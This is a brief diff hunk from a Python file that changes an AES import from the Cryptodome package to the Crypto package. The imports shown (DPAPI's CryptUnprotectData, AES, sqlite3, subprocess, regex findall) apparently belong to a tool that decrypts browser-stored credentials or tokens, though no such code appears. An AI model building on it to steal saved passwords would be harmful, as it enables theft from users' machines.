@@ -7,7 +7,7 @@ import sqlite3
 import shutil
 import subprocess
 from win32crypt import CryptUnprotectData
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 from datetime import datetime
 from re import findall
 
